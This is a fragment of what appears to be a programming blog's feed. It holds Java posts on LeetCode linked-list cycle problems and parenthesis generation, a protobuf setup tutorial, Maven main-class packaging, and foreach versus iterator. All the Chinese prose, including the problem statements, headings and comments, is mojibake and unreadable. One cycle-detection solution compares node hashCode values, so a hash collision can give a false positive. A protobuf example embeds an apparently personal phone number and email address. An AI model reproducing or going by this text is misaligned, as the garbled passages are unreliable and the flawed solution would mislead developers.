        <content type="html"><![CDATA[<pre><code>//ÁªôÂÆö‰∏Ä‰∏™ÈìæË°®ÔºåËøîÂõûÈìæË°®ÂºÄÂßãÂÖ•ÁéØÁöÑÁ¨¨‰∏Ä‰∏™ËäÇÁÇπ„ÄÇ Â¶ÇÊûúÈìæË°®Êó†ÁéØÔºåÂàôËøîÂõû null„ÄÇ //// ‰∏∫‰∫ÜË°®Á§∫ÁªôÂÆöÈìæË°®‰∏≠ÁöÑÁéØÔºåÊàë‰ª¨‰ΩøÁî®Êï¥Êï∞ pos Êù•Ë°®Á§∫ÈìæË°®Â∞æËøûÊé•Âà∞ÈìæË°®‰∏≠ÁöÑ‰ΩçÁΩÆÔºàÁ¥¢Âºï‰ªé 0 ÂºÄÂßãÔºâ„ÄÇ Â¶ÇÊûú pos ÊòØ -1ÔºåÂàôÂú®ËØ•ÈìæË°®‰∏≠Ê≤°ÊúâÁéØ„ÄÇÊ≥®ÊÑèÔºåpo//s ‰ªÖ‰ªÖÊòØÁî®‰∫éÊ†áËØÜÁéØÁöÑÊÉÖÂÜµÔºåÂπ∂‰∏ç‰ºö‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÂà∞ÂáΩÊï∞‰∏≠„ÄÇ //// ËØ¥ÊòéÔºö‰∏çÂÖÅËÆ∏‰øÆÊîπÁªôÂÆöÁöÑÈìæË°®„ÄÇ //// ËøõÈò∂Ôºö //// // ‰Ω†ÊòØÂê¶ÂèØ‰ª•‰∏çÁî®È¢ùÂ§ñÁ©∫Èó¥Ëß£ÂÜ≥Ê≠§È¢òÔºü // //// //// Á§∫‰æã 1Ôºö //// //// //ËæìÂÖ•Ôºöhead = [3,2,0,-4], pos = 1//ËæìÂá∫ÔºöËøîÂõûÁ¥¢Âºï‰∏∫ 1 ÁöÑÈìæË°®ËäÇÁÇπ//Ëß£ÈáäÔºöÈìæË°®‰∏≠Êúâ‰∏Ä‰∏™ÁéØÔºåÂÖ∂Â∞æÈÉ®ËøûÊé•Âà∞Á¨¨‰∫å‰∏™ËäÇÁÇπ„ÄÇ// //// Á§∫‰æã 2Ôºö //// //// //ËæìÂÖ•Ôºöhead = [1,2], pos = 0//ËæìÂá∫ÔºöËøîÂõûÁ¥¢Âºï‰∏∫ 0 ÁöÑÈìæË°®ËäÇÁÇπ//Ëß£ÈáäÔºöÈìæË°®‰∏≠Êúâ‰∏Ä‰∏™ÁéØÔºåÂÖ∂Â∞æÈÉ®ËøûÊé•Âà∞Á¨¨‰∏Ä‰∏™ËäÇÁÇπ„ÄÇ// //// Á§∫‰æã 3Ôºö //// //// //ËæìÂÖ•Ôºöhead = [1], pos = -1//ËæìÂá∫ÔºöËøîÂõû null//Ëß£ÈáäÔºöÈìæË°®‰∏≠Ê≤°ÊúâÁéØ„ÄÇ// //// //// ÊèêÁ§∫Ôºö //// // ÈìæË°®‰∏≠ËäÇÁÇπÁöÑÊï∞ÁõÆËåÉÂõ¥Âú®ËåÉÂõ¥ [0, 104] ÂÜÖ // -105 &lt;= Node.val &lt;= 105 // pos ÁöÑÂÄº‰∏∫ -1 ÊàñËÄÖÈìæË°®‰∏≠ÁöÑ‰∏Ä‰∏™ÊúâÊïàÁ¥¢Âºï // // Related Topics ÈìæË°® ÂèåÊåáÈíà // üëç 719 üëé 0//leetcode submit region begin(Prohibit modification and deletion)/** * Definition for singly-linked list. * class ListNode { *     int val; *     ListNode next; *     ListNode(int x) { *         val = x; *         next = null; *     } * } */public class Solution {    public ListNode detectCycle(ListNode head) {        if (head == null || head.next == null) {            return null;        }        ListNode low = head.next;        ListNode fast = head.next.next;        while (low!=null) {            if (fast == null || fast.next == null) {                return null;            }            if(low == fast){                ListNode newTravel = head;                while (newTravel!=low){                    low = low.next;                    newTravel = newTravel.next;                }                return low;            }            low = low.next;            fast = fast.next.next;        }        return null;    }}//leetcode submit region end(Prohibit modification and deletion)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode-141ÁéØÂΩ¢ÈìæË°®</title>
      <link href="/2020/10/11/leetcode-141%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/"/>
      <url>/2020/10/11/leetcode-141%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<pre><code>//ÁªôÂÆö‰∏Ä‰∏™ÈìæË°®ÔºåÂà§Êñ≠ÈìæË°®‰∏≠ÊòØÂê¶ÊúâÁéØ„ÄÇ //// Â¶ÇÊûúÈìæË°®‰∏≠ÊúâÊüê‰∏™ËäÇÁÇπÔºåÂèØ‰ª•ÈÄöËøáËøûÁª≠Ë∑üË∏™ next ÊåáÈíàÂÜçÊ¨°Âà∞ËææÔºåÂàôÈìæË°®‰∏≠Â≠òÂú®ÁéØ„ÄÇ ‰∏∫‰∫ÜË°®Á§∫ÁªôÂÆöÈìæË°®‰∏≠ÁöÑÁéØÔºåÊàë‰ª¨‰ΩøÁî®Êï¥Êï∞ pos Êù•Ë°®Á§∫ÈìæË°®Â∞æËøûÊé•Âà∞ÈìæË°®‰∏≠ÁöÑ//‰ΩçÁΩÆÔºàÁ¥¢Âºï‰ªé 0 ÂºÄÂßãÔºâ„ÄÇ Â¶ÇÊûú pos ÊòØ -1ÔºåÂàôÂú®ËØ•ÈìæË°®‰∏≠Ê≤°ÊúâÁéØ„ÄÇÊ≥®ÊÑèÔºöpos ‰∏ç‰Ωú‰∏∫ÂèÇÊï∞ËøõË°å‰º†ÈÄíÔºå‰ªÖ‰ªÖÊòØ‰∏∫‰∫ÜÊ†áËØÜÈìæË°®ÁöÑÂÆûÈôÖÊÉÖÂÜµ„ÄÇ //// Â¶ÇÊûúÈìæË°®‰∏≠Â≠òÂú®ÁéØÔºåÂàôËøîÂõû true „ÄÇ Âê¶ÂàôÔºåËøîÂõû false „ÄÇ //// //// ËøõÈò∂Ôºö //// ‰Ω†ËÉΩÁî® O(1)ÔºàÂç≥ÔºåÂ∏∏ÈáèÔºâÂÜÖÂ≠òËß£ÂÜ≥Ê≠§ÈóÆÈ¢òÂêóÔºü //// //// Á§∫‰æã 1Ôºö //// //// ËæìÂÖ•Ôºöhead = [3,2,0,-4], pos = 1//ËæìÂá∫Ôºötrue//Ëß£ÈáäÔºöÈìæË°®‰∏≠Êúâ‰∏Ä‰∏™ÁéØÔºåÂÖ∂Â∞æÈÉ®ËøûÊé•Âà∞Á¨¨‰∫å‰∏™ËäÇÁÇπ„ÄÇ// //// Á§∫‰æã 2Ôºö //// //// ËæìÂÖ•Ôºöhead = [1,2], pos = 0//ËæìÂá∫Ôºötrue//Ëß£ÈáäÔºöÈìæË°®‰∏≠Êúâ‰∏Ä‰∏™ÁéØÔºåÂÖ∂Â∞æÈÉ®ËøûÊé•Âà∞Á¨¨‰∏Ä‰∏™ËäÇÁÇπ„ÄÇ// //// Á§∫‰æã 3Ôºö //// //// ËæìÂÖ•Ôºöhead = [1], pos = -1//ËæìÂá∫Ôºöfalse//Ëß£ÈáäÔºöÈìæË°®‰∏≠Ê≤°ÊúâÁéØ„ÄÇ// //// //// ÊèêÁ§∫Ôºö //// // ÈìæË°®‰∏≠ËäÇÁÇπÁöÑÊï∞ÁõÆËåÉÂõ¥ÊòØ [0, 104] // -105 &lt;= Node.val &lt;= 105 // pos ‰∏∫ -1 ÊàñËÄÖÈìæË°®‰∏≠ÁöÑ‰∏Ä‰∏™ ÊúâÊïàÁ¥¢Âºï „ÄÇ // // Related Topics ÈìæË°® ÂèåÊåáÈíà // üëç 820 üëé 0//leetcode submit region begin(Prohibit modification and deletion)import java.util.HashSet;import java.util.Set;/** * Definition for singly-linked list. * class ListNode { *     int val; *     ListNode next; *     ListNode(int x) { *         val = x; *         next = null; *     } * } */public class Solution {    public boolean hasCycle(ListNode head) {        Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;();        while (head!=null){            if (set.contains(head.hashCode())) {                return true;            }            set.add(head.hashCode());            head = head.next;        }        return false;    }}//leetcode submit region end(Prohibit modification and deletion)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode-22Êã¨Âè∑ÁîüÊàê</title>
      <link href="/2020/10/10/leetcode-22%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/"/>
      <url>/2020/10/10/leetcode-22%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<pre><code>//Êï∞Â≠ó n ‰ª£Ë°®ÁîüÊàêÊã¨Âè∑ÁöÑÂØπÊï∞ÔºåËØ∑‰Ω†ËÆæËÆ°‰∏Ä‰∏™ÂáΩÊï∞ÔºåÁî®‰∫éËÉΩÂ§üÁîüÊàêÊâÄÊúâÂèØËÉΩÁöÑÂπ∂‰∏î ÊúâÊïàÁöÑ Êã¨Âè∑ÁªÑÂêà„ÄÇ //// //// Á§∫‰æãÔºö //// ËæìÂÖ•Ôºön = 3//ËæìÂá∫Ôºö[//       &quot;((()))&quot;,//       &quot;(()())&quot;,//       &quot;(())()&quot;,//       &quot;()(())&quot;,//       &quot;()()()&quot;//     ]// // Related Topics Â≠óÁ¨¶‰∏≤ ÂõûÊ∫ØÁÆóÊ≥ï // üëç 1356 üëé 0import java.util.ArrayList;import java.util.List;//leetcode submit region begin(Prohibit modification and deletion)class Solution {    // ÂÖ®Â±ÄÂèòÈáè    private List&lt;String&gt; list = new ArrayList&lt;&gt;();    public List&lt;String&gt; generateParenthesis(int n) {        // ÁîüÊàêÈ¢òÁõÆÂΩìÁÑ∂‰∏çËÉΩÊòØforÂæ™ÁéØÁîüÊàê        dfs(0, 0, n, &quot;&quot;);        return list;    }    public void dfs(int left, int right, int n, String path) {        // ÊéíÈô§Êéâ Êã¨Âè∑Êï∞ÈáèÂ§™Â§öÁöÑÈÄâÊâã        if (left &gt; n || right &gt; n) {            return;        }        // Â¶ÇÊûúÂè≥ËæπÂ§ß‰∫éÂ∑¶ËæπÔºåÈÇ£‰πàÂ∞±Âà†Èô§ÂΩìÂâçÈÄâÊâã        if (right&gt;left) {            return;        }        // final champion        if (left + right == 2 * n) {            list.add(path);            return;        }        dfs(left + 1, right, n, path + &quot;(&quot;);        dfs(left, right + 1, n, path + &quot;)&quot;);    }}//leetcode submit region end(Prohibit modification and deletion)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>google protobuf</title>
      <link href="/2020/09/08/google%20protobuf/"/>
      <url>/2020/09/08/google%20protobuf/</url>
      
        <content type="html"><![CDATA[<h1 id="google-protobuf"><a href="#google-protobuf" class="headerlink" title="google protobuf"></a>google protobuf</h1><h3 id="‰∏ãËΩΩÂ∑•ÂÖ∑"><a href="#‰∏ãËΩΩÂ∑•ÂÖ∑" class="headerlink" title="‰∏ãËΩΩÂ∑•ÂÖ∑"></a>‰∏ãËΩΩÂ∑•ÂÖ∑</h3><p><a href="https://github.com/protocolbuffers/protobuf/releases/tag/v3.13.0" target="_blank" rel="noopener"> https://github.com/protocolbuffers/protobuf/releases/tag/v3.13.0</a><br>Áî±‰∫éÊàë‰ΩøÁî®ÁöÑÊòØwindowsX64ÔºåÊàëÈÄâÊã©win64ÁâàÊú¨<br>‰∏ãËΩΩÂêéÔºåËß£ÂéãÂ∞ÜbinÁõÆÂΩïÊîæÂÖ•ÁéØÂ¢ÉÂèòÈáèÈáåÈù¢</p><h3 id="ÁºñÂÜôprotoÊñá‰ª∂"><a href="#ÁºñÂÜôprotoÊñá‰ª∂" class="headerlink" title="ÁºñÂÜôprotoÊñá‰ª∂"></a>ÁºñÂÜôprotoÊñá‰ª∂</h3><p>Êñ∞Âª∫Êñá‰ª∂AddressBook.protoÊñá‰ª∂</p><pre><code>syntax = &quot;proto2&quot;;package tutorial;option java_package = &quot;com.example.tutorial&quot;;option java_outer_classname = &quot;AddressBookProtos&quot;;message Person {  required string name = 1;  required int32 id = 2;  optional string email = 3;  enum PhoneType {    MOBILE = 0;    HOME = 1;    WORK = 2;  }  message PhoneNumber {    required string number = 1;    optional PhoneType type = 2 [default = HOME];  }  repeated PhoneNumber phones = 4;}message AddressBook {  repeated Person people = 1;}</code></pre><p>Âú®ÂΩìÂâçÁõÆÂΩïËøêË°åÊîπÂëΩ‰ª§ÔºåÊ≥®ÊÑèjava_outÂ•ΩÂÉè‰∏çÊîØÊåÅÁªùÂØπË∑ØÂæÑ,ÊîØÊåÅÁõ∏ÂØπË∑ØÂæÑ</p><pre><code>$ protoc --java_out=. addressbook.proto</code></pre><h3 id="È°πÁõÆ‰∏≠ÂÆûÊàò"><a href="#È°πÁõÆ‰∏≠ÂÆûÊàò" class="headerlink" title="È°πÁõÆ‰∏≠ÂÆûÊàò"></a>È°πÁõÆ‰∏≠ÂÆûÊàò</h3><pre><code>protoc --java_out=../src/main/java  addressbook.proto# Êñ∞Âª∫Êñá‰ª∂ÔºåÊ≥®ÊÑèÈúÄË¶Å‰øÆÊîπprotoÈáåÈù¢ÁöÑÊñá‰ª∂ÈáåÈù¢ÁöÑpackageÂíåÂÆûÈôÖÂΩì‰∏≠ÁöÑ‰∏ÄÁõ¥# ËØ¥ÂÆûËØùÔºåËøôÂ∞±ÊòØÂíåÈÇ£‰∏™tk-mybatis‰∏ÄÊ†∑ÔºåËá™Âä®ÁîüÊàêÊñá‰ª∂</code></pre><p>ÁîüÊàêÂ•ΩÂêéÔºåÊâìÂºÄÊñá‰ª∂AddressBookProtos.javaÊñá‰ª∂ÔºåÊòØË¢´final‰øÆÈ•∞ÁöÑÔºåÊàë‰ª¨‰∏çË¶Å‰øÆÊîπÔºåËøòÁº∫‰∏Ä‰∫õ‰∏úË•øÔºåÈúÄË¶ÅÊàë‰ª¨ÂºïÂÖ•jarÂåÖ</p><pre><code>&lt;!-- https://mvnrepository.com/artifact/com.google.protobuf/protobuf-java --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.google.protobuf&lt;/groupId&gt;    &lt;artifactId&gt;protobuf-java&lt;/artifactId&gt;    &lt;version&gt;3.12.4&lt;/version&gt;&lt;/dependency&gt;</code></pre><h4 id="Êàë‰ª¨Êù•‰∏§‰∏™Ê°à‰æãÔºå‰∏Ä‰∏™ÂÜôÊñá‰ª∂‰∏Ä‰∏™ËØªÊñá‰ª∂"><a href="#Êàë‰ª¨Êù•‰∏§‰∏™Ê°à‰æãÔºå‰∏Ä‰∏™ÂÜôÊñá‰ª∂‰∏Ä‰∏™ËØªÊñá‰ª∂" class="headerlink" title="Êàë‰ª¨Êù•‰∏§‰∏™Ê°à‰æãÔºå‰∏Ä‰∏™ÂÜôÊñá‰ª∂‰∏Ä‰∏™ËØªÊñá‰ª∂"></a>Êàë‰ª¨Êù•‰∏§‰∏™Ê°à‰æãÔºå‰∏Ä‰∏™ÂÜôÊñá‰ª∂‰∏Ä‰∏™ËØªÊñá‰ª∂</h4><pre><code>public class WriteValueToFile {    public static void main(String[] args) throws IOException {        AddressBookProtos.AddressBook addressBook = AddressBookProtos.AddressBook.newBuilder()                .mergeFrom(new FileInputStream(&quot;addressBook.txt&quot;))                .addPeople(AddressBookProtos.Person.newBuilder()                        .setEmail(&quot;adios@qq.com&quot;)                        .setId(1025)                        .setName(&quot;adios&quot;)                        .addPhones(AddressBookProtos.Person.PhoneNumber.newBuilder()                                .setNumber(&quot;15851741817&quot;)                                .setType(AddressBookProtos.Person.PhoneType.HOME)                                .build())                        .build())                .build();        FileOutputStream fos = new FileOutputStream(&quot;addressBook.txt&quot;);        addressBook.writeTo(fos);        fos.close();    }}public class ReadValueFromFile {    public static void main(String[] args) throws IOException {        FileInputStream fis = new FileInputStream(&quot;addressBook.txt&quot;);        AddressBookProtos.AddressBook addressBook = AddressBookProtos.AddressBook.parseFrom(fis);        List&lt;AddressBookProtos.Person&gt; peopleList = addressBook.getPeopleList();        for (AddressBookProtos.Person person : peopleList) {            System.out.println(&quot;personal information &quot; + person.getId() + &quot; &quot; + person.getEmail() + &quot; &quot; + person.getName());            for (AddressBookProtos.Person.PhoneNumber phone : person.getPhonesList()) {                System.out.println(&quot;phone &quot; + phone.getNumber() + &quot; &quot; + phone.getType().getValueDescriptor());            }        }    }}</code></pre><h3 id="ËÆ≤ËÆ≤‰∏∫‰ªÄ‰πàÂ≠¶‰π†Ëøô‰∏™"><a href="#ËÆ≤ËÆ≤‰∏∫‰ªÄ‰πàÂ≠¶‰π†Ëøô‰∏™" class="headerlink" title="ËÆ≤ËÆ≤‰∏∫‰ªÄ‰πàÂ≠¶‰π†Ëøô‰∏™"></a>ËÆ≤ËÆ≤‰∏∫‰ªÄ‰πàÂ≠¶‰π†Ëøô‰∏™</h3><p>È¶ñÂÖàÂú®Â≠¶‰π†nettyËøáÁ®ã‰∏≠ÔºåÂ§öÊ¨°Á¢∞Âà∞Ëøô‰∏™„ÄÇ‰ªäÂ§©ÁúãÂà´‰∫∫È°πÁõÆÔºåÊ≠£Â•ΩÁúãËßÅËøô‰∏™ÔºåÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ã<br>ÂÆòÊñπÊñáÊ°£Ôºö <a href="https://developers.google.com/protocol-buffers/docs/javatutorial" target="_blank" rel="noopener"> https://developers.google.com/protocol-buffers/docs/javatutorial</a><br>ÊñáÊ°£ÈáåÈù¢ËÆ≤‰∫ÜÔºö‰∏∫‰ªÄ‰πà‰ΩøÁî®Ëøô‰∏™google protocol</p><ul><li>Use Java Serialization. This is the default approach since it‚Äôs built into the language, but it has a host of well-known problems (see Effective Java, by Josh Bloch pp. 213), and also doesn‚Äôt work very well if you need to share data with applications written in C++ or Python. </li><li>You can invent an ad-hoc way to encode the data items into a single string ‚Äì such as encoding 4 ints as ‚Äú12:3:-23:67‚Äù. This is a simple and flexible approach, although it does require writing one-off encoding and parsing code, and the parsing imposes a small run-time cost. This works best for encoding very simple data. </li><li>Serialize the data to XML. This approach can be very attractive since XML is (sort of) human readable and there are binding libraries for lots of languages. This can be a good choice if you want to share data with other applications/projects. However, XML is notoriously space intensive, and encoding/decoding it can impose a huge performance penalty on applications. Also, navigating an XML DOM tree is considerably more complicated than navigating simple fields in a class normally would be. </li></ul><ol><li>javaÁöÑÂ∫èÂàóÂåñÊ≤°ÂäûÊ≥ïÂíåÂÖ∂‰ªñËØ≠Ë®ÄÂÖ±‰∫´Êï∞ÊçÆ </li><li>Â¶ÇÊûúÊòØÁÆÄÂçïÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•ËÆæËÆ°‰∏Ä‰∏™ËßÑÂàôÔºåÔºöÂàÜÂâ≤„ÄÇËøôÂØπÁÆÄÂçïÊï∞ÊçÆÁºñÁ†ÅÊòØÊúâÊïàÁöÑ </li><li>‰ΩøÁî®xml,‰ΩÜÊòØxml‰ºöÂç†Áî®Â§ßÈáèÁ©∫Èó¥ </li></ol><p>Êñá‰∏≠Âπ∂Ê≤°ÊúâÊØîËæÉjsonÁõ∏ÂÖ≥ÁöÑ.</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mavenÊåáÂÆöËøêË°åmainÂáΩÊï∞</title>
      <link href="/2020/09/06/maven%E6%8C%87%E5%AE%9A%E8%BF%90%E8%A1%8Cmain%E5%87%BD%E6%95%B0/"/>
      <url>/2020/09/06/maven%E6%8C%87%E5%AE%9A%E8%BF%90%E8%A1%8Cmain%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="mavenÊåáÂÆöËøêË°åmainÂáΩÊï∞"><a href="#mavenÊåáÂÆöËøêË°åmainÂáΩÊï∞" class="headerlink" title="mavenÊåáÂÆöËøêË°åmainÂáΩÊï∞"></a>mavenÊåáÂÆöËøêË°åmainÂáΩÊï∞</h1><h4 id="ËÉåÊôØ"><a href="#ËÉåÊôØ" class="headerlink" title="ËÉåÊôØ"></a>ËÉåÊôØ</h4><p>ÊúÄËøëËá™Â∑±ÂÜôÁöÑÂ∞èÈ°πÁõÆÔºåÊâìÂåÖÁöÑÊó∂ÂÄô‰ºöÂá∫Áé∞ÈóÆÈ¢òÔºåÊÄªÊòØÊèêÁ§∫Áº∫Â∞ë‰∏ªÁ±ªÊàñËÄÖÊâìÂåÖÂ•ΩÂêéÊä• <code>classNotFoundException</code> ÈîôËØØÔºåÊúÄÂêéÊâçÂèëÁé∞Âú®Ëøô‰∏™ÈóÆÈ¢ò</p><pre><code>&lt;build&gt;        &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;            &lt;plugins&gt;                &lt;plugin&gt;                    ....                &lt;/plugin&gt;            &lt;/plugins&gt;    &lt;/pluginManagement&gt;&lt;/build&gt;</code></pre><p>ÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ãstackoverflow<br>The difference between <code>&lt;pluginManagement/&gt;</code> and <code>&lt;plugins/&gt;</code> is that a <code>&lt;plugin/&gt;</code> under:</p><ul><li><code>&lt;pluginManagement/&gt;</code> defines the settings for plugins that will be inherited by modules in your build. This is great for cases where you have a parent pom file. </li><li><code>&lt;plugins/&gt;</code> is an actual invocation of the plugin. It may or may not be inherited from a <code>&lt;pluginManagement/&gt;</code> . </li></ul><p>You don‚Äôt need to have a <code>&lt;pluginManagement/&gt;</code> in your project, if it‚Äôs not<br>a parent POM. However, if it‚Äôs a parent pom, then in the child‚Äôs pom, you need<br>to have a declaration like:<br>Â§ßÊ¶ÇÁöÑÊÑèÊÄùÊòØpluginManagementÊòØ‰∏∫‰∫ÜÊúâÁà∂pomÊñπ‰æøÁªßÊâø<br>ËÄåpluginÊòØÁúüÂÆûË∞ÉÁî®ÁöÑ</p><p><strong>ÊâÄ‰ª•ÔºåÊàë‰ª¨Ë¶ÅÁ°ÆÂÆö‰∏ÄÁÇπÊòØÔºåÊàë‰ª¨ÈúÄË¶Å‰øÆÊîπÁöÑÊòØbuildÊ†áÁ≠æ‰∏ãÁöÑpluginsËÄå‰∏çÊòØbuild pluginManagement‰∏ãÁöÑplugins</strong></p><h4 id="ÊñπÊ≥ï‰∏ÄÔºö‰øÆÊîπjar-pluginÔºåÈáåÈù¢Âä†ÂÖ•ÂèÇÊï∞"><a href="#ÊñπÊ≥ï‰∏ÄÔºö‰øÆÊîπjar-pluginÔºåÈáåÈù¢Âä†ÂÖ•ÂèÇÊï∞" class="headerlink" title="ÊñπÊ≥ï‰∏ÄÔºö‰øÆÊîπjar-pluginÔºåÈáåÈù¢Âä†ÂÖ•ÂèÇÊï∞"></a>ÊñπÊ≥ï‰∏ÄÔºö‰øÆÊîπjar-pluginÔºåÈáåÈù¢Âä†ÂÖ•ÂèÇÊï∞</h4><h5 id="‰øÆÊîπcompiler-plugin"><a href="#‰øÆÊîπcompiler-plugin" class="headerlink" title="‰øÆÊîπcompiler-plugin"></a>‰øÆÊîπcompiler-plugin</h5><pre><code> &lt;plugin&gt;   &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;   &lt;configuration&gt;     &lt;source&gt;1.8&lt;/source&gt;     &lt;target&gt;1.8&lt;/target&gt;     &lt;encoding&gt;UTF-8&lt;/encoding&gt;     &lt;showDeprecation&gt;true&lt;/showDeprecation&gt;   &lt;/configuration&gt;   &lt;version&gt;3.8.0&lt;/version&gt;&lt;/plugin&gt;</code></pre><h5 id="‰øÆÊîπjar-plugin"><a href="#‰øÆÊîπjar-plugin" class="headerlink" title="‰øÆÊîπjar-plugin"></a>‰øÆÊîπjar-plugin</h5><pre><code>&lt;plugin&gt;                    &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;                    &lt;version&gt;3.0.2&lt;/version&gt;                    &lt;configuration&gt;                        &lt;archive&gt;                            &lt;manifest&gt;                                &lt;mainClass&gt;com.huskyui.LogMain&lt;/mainClass&gt;                            &lt;/manifest&gt;                        &lt;/archive&gt;                    &lt;/configuration&gt;                &lt;/plugin&gt;</code></pre><h4 id="ÊñπÊ≥ï‰∫åÔºöÂä†ÂÖ•shadeÊèí‰ª∂"><a href="#ÊñπÊ≥ï‰∫åÔºöÂä†ÂÖ•shadeÊèí‰ª∂" class="headerlink" title="ÊñπÊ≥ï‰∫åÔºöÂä†ÂÖ•shadeÊèí‰ª∂"></a>ÊñπÊ≥ï‰∫åÔºöÂä†ÂÖ•shadeÊèí‰ª∂</h4><p>ÂÆòÊñπÊñáÊ°£</p><pre><code>&lt;plugins&gt;            &lt;plugin&gt;                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;                &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt;                &lt;version&gt;3.2.4&lt;/version&gt;                &lt;executions&gt;                    &lt;execution&gt;                        &lt;goals&gt;                            &lt;goal&gt;shade&lt;/goal&gt;                        &lt;/goals&gt;                        &lt;configuration&gt;                            &lt;transformers&gt;                                &lt;transformer implementation=&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;&gt;                                    &lt;manifestEntries&gt;                                        &lt;Main-Class&gt;${app.main.class}&lt;/Main-Class&gt;                                    &lt;/manifestEntries&gt;                                &lt;/transformer&gt;                            &lt;/transformers&gt;                        &lt;/configuration&gt;                    &lt;/execution&gt;                &lt;/executions&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java‰∏≠foreachÂíåiterator</title>
      <link href="/2020/08/07/java%E4%B8%ADforeach%E5%92%8Citerator/"/>
      <url>/2020/08/07/java%E4%B8%ADforeach%E5%92%8Citerator/</url>
      
        <content type="html"><![CDATA[<h1 id="java‰∏≠foreach"><a href="#java‰∏≠foreach" class="headerlink" title="java‰∏≠foreach"></a>java‰∏≠foreach</h1><h4 id="ÂÖ•Èó®"><a href="#ÂÖ•Èó®" class="headerlink" title="ÂÖ•Èó®"></a>ÂÖ•Èó®</h4><p>‰ªäÂ§©Èó≤Êù•Êó†‰∫ãÔºåÂ∏àÁà∂ËÆ©ÊàëÁúã‰∏Ä‰∏ãÔºåËø≠‰ª£Âô®Âú®‰∏Ä‰∏™Âæ™ÁéØÈáåÈù¢ËøûÁª≠‰∏§Ê¨°iterator.remove()ÁöÑÈóÆÈ¢òÔºåÂõ†‰∏∫‰ªäÂ§©Áúã‰∏Ä‰∏™Á¶ªËÅå‰∫∫ÂëòÁöÑ‰ª£Á†ÅÔºåÈáåÈù¢ÂÜô‰∫ÜËøô‰∏™„ÄÇ<br>Êàë‰ª¨Áúã‰∏Ä‰∏ãÊµãËØï‰ª£Á†ÅÔºö</p><pre><code>List&lt;Integer&gt; list = new ArrayList&lt;&gt;();list.add(1);list.add(2);list.add(3);list.add(4);for (Integer value:list){    logger.debug(value);}//ËæìÂá∫2020-08-07 09:58:12,323 DEBUG (com.huskyui.App:main) -12020-08-07 09:58:12,324 DEBUG (com.huskyui.App:main) -22020-08-07 09:58:12,325 DEBUG (com.huskyui.App:main) -32020-08-07 09:58:12,325 DEBUG (com.huskyui.App:main) -4</code></pre><p>ÂèçÁºñËØëÊñá‰ª∂</p><pre><code>List&lt;Integer&gt; list = new ArrayList();list.add(1);list.add(2);list.add(3);list.add(4);Iterator var2 = list.iterator();while(var2.hasNext()) {    Integer value = (Integer)var2.next();    logger.debug(value);}// ÁîüÊàêËø≠‰ª£Âô®</code></pre><h4 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h4><p>Ëø≠‰ª£Âô®ÈáåÈù¢ÁöÑ‰ªãÁªçÊòØÔºö_Iterators allow the caller to remove elements from the underlying<br>collection during the iteration with well-defined<br>semantics._Ëø≠‰ª£Âô®ÂÖÅËÆ∏Ë∞ÉÁî®ËÄÖÂú®Ëø≠‰ª£ÊúüÈó¥‰ΩøÁî®ÂÆö‰πâËâØÂ•ΩÁöÑËØ≠‰πâ‰ªéÂü∫Á°ÄÈõÜÂêà‰∏≠Âà†Èô§ÂÖÉÁ¥†.</p><pre><code>List&lt;Integer&gt; list = new ArrayList&lt;&gt;();list.add(1);list.add(2);list.add(3);list.add(4);Iterator iterator = list.iterator();logger.debug(&quot;Iterator ‰ªéÂâçÂêëÂêéÈÅçÂéÜ:&quot;);while (iterator.hasNext()){    Integer value = (Integer)iterator.next();    logger.debug(value);}// Â¢ûÂº∫Áâàiterator listIteratorlogger.debug(&quot;listIterator‰ªéÂâçÂêëÂêéÈÅçÂéÜ&quot;);ListIterator iterator1 = list.listIterator();while (iterator1.hasNext()){    Integer value = (Integer)iterator1.next();    logger.debug(value);}logger.debug(&quot;listIterator‰ªéÂêéÂêëÂâçÈÅçÂéÜÔºö&quot;);while (iterator1.hasPrevious()){    logger.debug(iterator1.previous());}/**2020-08-07 11:07:44,832 DEBUG (com.huskyui.App:main) -Iterator ‰ªéÂâçÂêëÂêéÈÅçÂéÜ:2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -12020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -22020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -32020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -42020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -listIterator‰ªéÂâçÂêëÂêéÈÅçÂéÜ2020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -12020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -22020-08-07 11:07:44,837 DEBUG (com.huskyui.App:main) -32020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -42020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) 